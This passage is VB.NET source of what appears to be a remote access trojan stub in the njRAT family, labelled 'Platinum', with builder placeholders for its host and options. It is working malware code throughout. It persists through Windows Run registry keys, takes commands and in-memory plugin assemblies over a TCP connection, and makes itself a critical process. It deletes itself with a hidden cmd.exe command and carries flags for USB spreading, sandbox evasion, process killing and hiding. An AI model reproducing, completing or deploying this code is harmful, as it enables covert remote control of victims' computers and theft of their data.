                                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                            End If
                        Catch exception11 As Exception
                            ProjectData.SetProjectError(exception11)
                            Dim exception5 As Exception = exception11
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            If Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.LocalMachine.GetValue((OK.sf & "\" & OK.RG), ""), ("""" & OK.LO.FullName & """ .."), False) Then
                                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                            End If
                        Catch exception12 As Exception
                            ProjectData.SetProjectError(exception12)
                            Dim exception6 As Exception = exception12
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                Catch exception13 As Exception
                    ProjectData.SetProjectError(exception13)
                    Dim exception7 As Exception = exception13
                    ProjectData.ClearProjectError()
                End Try
            Loop
        End Sub

        Public Shared Function md5(ByVal B As Byte()) As String
            B = New MD5CryptoServiceProvider().ComputeHash(B)
            Dim str2 As String = ""
            Dim num As Byte
            For Each num In B
                str2 = (str2 & num.ToString("x2"))
            Next
            Return str2
        End Function

        <DllImport("ntdll")>
        Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
        End Function

        Public Shared Function Plugin(ByVal b As Byte(), ByVal c As String) As Object
            Dim [Module] As [Module]
            For Each [Module] In Assembly.Load(b).GetModules
                Dim type As Type
                For Each type In [Module].GetTypes
                    If type.FullName.EndsWith(("." & c)) Then
                        Return [Module].Assembly.CreateInstance(type.FullName)
                    End If
                Next
            Next
            Return Nothing
        End Function

        Public Shared Sub pr(ByVal i As Integer)
            Try
                OK.NtSetInformationProcess(Process.GetCurrentProcess.Handle, &H1D, i, 4)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Sub RC()
Label_0000:
            OK.lastcap = ""
            If (Not OK.C Is Nothing) Then
                Dim num As Long = -1
                Dim num2 As Integer = 0
                Try
Label_001B:
                    num2 += 1
                    If (num2 = 10) Then
                        num2 = 0
                        Thread.Sleep(1)
                    End If
                    If Not OK.Cn Then
                        GoTo Label_01C1
                    End If
                    If (OK.C.Available < 1) Then
                        OK.C.Client.Poll(-1, SelectMode.SelectRead)
                    End If
Label_0057:
                    If (OK.C.Available > 0) Then
                        If (num = -1) Then
                            Dim str As String = ""
                            Do While True
                                Dim charCode As Integer = OK.C.GetStream.ReadByte
                                Select Case charCode
                                    Case -1
                                        GoTo Label_01C1
                                    Case 0
                                        num = Conversions.ToLong(str)
                                        str = ""
                                        If (num = 0) Then
                                            OK.Send("")
                                            num = -1
                                        End If
                                        If (OK.C.Available <= 0) Then
                                            GoTo Label_001B
                                        End If
                                        GoTo Label_0057
                                End Select
                                str = (str & Conversions.ToString(Conversions.ToInteger(Strings.ChrW(charCode).ToString)))
                            Loop
                        End If
                        OK.b = New Byte((OK.C.Available + 1) - 1) {}
                        Dim num5 As Long = (num - OK.MeM.Length)
                        If (OK.b.Length > num5) Then
                            OK.b = New Byte((CInt((num5 - 1)) + 1) - 1) {}
                        End If
                        Dim count As Integer = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None)
                        OK.MeM.Write(OK.b, 0, count)
                        If (OK.MeM.Length = num) Then
                            num = -1
                            Dim thread As New Thread(New ParameterizedThreadStart(AddressOf OK._Lambda__1), 1)
                            thread.Start(OK.MeM.ToArray)
                            thread.Join(100)
                            OK.MeM.Dispose()
                            OK.MeM = New MemoryStream
                        End If
                        GoTo Label_001B
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                End Try
            End If
Label_01C1:
            Try
                If (Not OK.PLG Is Nothing) Then
                    NewLateBinding.LateCall(OK.PLG, Nothing, "clear", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                    OK.PLG = Nothing
                End If
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                ProjectData.ClearProjectError()
            End Try
            OK.Cn = False
            If Not OK.connect Then
                GoTo Label_01C1
            End If
            OK.Cn = True
            GoTo Label_0000
        End Sub

        Public Shared Function SB(ByRef S As String) As Byte()
            Return Encoding.UTF8.GetBytes(S)
        End Function

        Public Shared Function Send(ByVal S As String) As Boolean
            Return OK.Sendb(OK.SB(S))
        End Function

        Public Shared Function Sendb(ByVal b As Byte()) As Boolean
            If Not OK.Cn Then
                Return False
            End If
            Try
                Dim lO As FileInfo = OK.LO
                SyncLock lO
                    If Not OK.Cn Then
                        Return False
                    End If
                    Dim stream As New MemoryStream
                    Dim length As Integer = b.Length
                    Dim buffer As Byte() = OK.SB((length.ToString & ChrW(0)))
                    stream.Write(buffer, 0, buffer.Length)
                    stream.Write(b, 0, b.Length)
                    OK.C.Client.Send(stream.ToArray, 0, CInt(stream.Length), SocketFlags.None)
                End SyncLock
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Try
                    If OK.Cn Then
                        OK.Cn = False
                        OK.C.Close()
                    End If
                Catch exception3 As Exception
                    ProjectData.SetProjectError(exception3)
                    Dim exception2 As Exception = exception3
                    ProjectData.ClearProjectError()
                End Try
                ProjectData.ClearProjectError()
            End Try
            Return OK.Cn
        End Function

        Public Shared Function STV(ByVal n As String, ByVal t As Object, ByVal typ As RegistryValueKind) As Boolean
            Dim flag As Boolean
            Try
                OK.F.Registry.CurrentUser.CreateSubKey(("Software\" & OK.RG)).SetValue(n, RuntimeHelpers.GetObjectValue(t), typ)
                flag = True
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                flag = False
                ProjectData.ClearProjectError()
            End Try
            Return flag
        End Function

        Public Shared Sub UNS()

            Dim drivers As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
            Dim driver() As String = (IO.Directory.GetLogicalDrives)
            For Each drivers In driver
                Try
                    If System.IO.File.Exists(drivers & OK.RG) = True Then
                        System.IO.File.Delete(drivers & OK.RG)
                    End If
                Catch
                End Try
            Next


            If IO.File.Exists(IO.Path.GetTempPath & "sand.dat") Then
                Try
                    IO.File.Delete(IO.Path.GetTempPath & "sand.dat")
                Catch ex As Exception
                End Try
            Else
            End If

            If IO.File.Exists(IO.Path.GetTempPath & "select.dat") Then
                Try
                    IO.File.Delete(IO.Path.GetTempPath & "select.dat")
                Catch ex As Exception
                End Try
            Else
            End If

            If IO.File.Exists(IO.Path.GetTempPath & "scream.wav") Then
                Try
                    IO.File.Delete(IO.Path.GetTempPath & "scream.wav")
                Catch ex As Exception
                End Try
            Else
            End If

            OK.pr(0)
            OK.Isu = False
            Try
                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Try
                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception2 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try

            Try
                If OK.HIDE_ME = True Then
                    File.SetAttributes((Interaction.Environ(OK.DR) & "\" & OK.EXE), FileAttributes.Normal)
                Else
                End If
                'If (Not OK.FS Is Nothing) Then
                'OK.FS.Dispose()
                Dim newRG As String = System.IO.Path.GetFileNameWithoutExtension(Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG)
                File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & newRG & ".url"))
                File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG))
                ' End If
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception4 As Exception = exception9
                ProjectData.ClearProjectError()
            End Try
            Try
                OK.F.Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(OK.RG, False)
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception5 As Exception = exception10
                ProjectData.ClearProjectError()
            End Try
            Try
                Interaction.Shell(("cmd.exe /c ping 0 -n 2 & del """ & OK.LO.FullName & """"), AppWinStyle.Hide, False, -1)
            Catch exception11 As Exception
                ProjectData.SetProjectError(exception11)
                Dim exception6 As Exception = exception11
                ProjectData.ClearProjectError()
            End Try
            ProjectData.EndApp()
        End Sub

        Public Shared Function ZIP(ByVal B As Byte()) As Byte()
            Dim stream2 As New MemoryStream(B)
            Dim stream As New GZipStream(stream2, CompressionMode.Decompress)
            Dim buffer2 As Byte() = New Byte(4 - 1) {}
            stream2.Position = (stream2.Length - 5)
            stream2.Read(buffer2, 0, 4)
            Dim count As Integer = BitConverter.ToInt32(buffer2, 0)
            stream2.Position = 0
            Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
            stream.Read(array, 0, count)
            stream.Dispose()
            stream2.Dispose()
            Return array
        End Function


        ' Fields
        Public Shared PasteE As Boolean = Conversions.ToBoolean("[PasteE]")
        Public Shared PASTEBIN As String = "[PASTEBIN]"
        Public Shared Sched As Boolean = Conversions.ToBoolean("[Sched]")
        Public Shared SCHEDNAME As String = "[SCHEDNAME]"
        Public Shared ANYRUN As Boolean = Conversions.ToBoolean("[ANYRUN]")
        Public Shared Bypass As String = "[Bypass]"
        Public Shared TaskMGR As Boolean = Conversions.ToBoolean("[TaskMGR]")
        Public Shared Melty As Boolean = Conversions.ToBoolean("[Melty]")
        Public Shared KProc As Boolean = Conversions.ToBoolean("[KProc]")
        Public Shared Proc As String = "[Proc]"
        Public Shared SLP As String = "[SLP]"
        Private Shared b As Byte() = New Byte(&H1401 - 1) {}
        Public Shared BD As Boolean = Conversions.ToBoolean("[BD]")
        Public Shared C As TcpClient = Nothing
        Public Shared Cn As Boolean = False
        Public Shared DR As String = "[DR]"
        Public Shared SCREAM As String = "off"
        Public Shared WINMIN As String = "off"
        Public Shared EXE As String = "[EXE]"
        Public Shared F As Computer = New Computer
        Public Shared FS As FileStream
        Public Shared H As String = "[H]"
        Public Shared Idr As Boolean = Conversions.ToBoolean("[Idr]")
        Public Shared Anti_CH As Boolean = Conversions.ToBoolean("[Anti_CH]")
        Public Shared IsF As Boolean = Conversions.ToBoolean("[Isf]")
        Public Shared USB_SP As Boolean = Conversions.ToBoolean("[USB_SP]")
        Public Shared Isu As Boolean = Conversions.ToBoolean("[Isu]")
        Public Shared kq As kl = Nothing
        Private Shared lastcap As String = ""
        Public Shared LO As FileInfo = New FileInfo(Assembly.GetEntryAssembly.Location)
        Private Shared MeM As MemoryStream = New MemoryStream
        Public Shared MT As Object = Nothing
        Public Shared P As String = "[P]"
        Public Shared PLG As Object = Nothing
        Public Shared RG As String = "[EXE]"
        Public Shared sf As String = "Software\Microsoft\Windows\CurrentVersion\Run"
        Public Shared VN As String = "[VN]"
        Public Shared NTTA As String = "WhyYouReverseMe..ImInnocent..LoveYouu.."
        Public Shared VR As String = "Platinum"
        Public Shared Y As String = "[Y]"
        Public Shared BOT_KILL As Boolean = Conversions.ToBoolean("[BOTKILL]")
        Public Shared HIDE_ME As Boolean = Conversions.ToBoolean("[HIDE_ME]")
        Public Shared Persis As Boolean = Conversions.ToBoolean("[Persis]")

    End Class














End Namespace

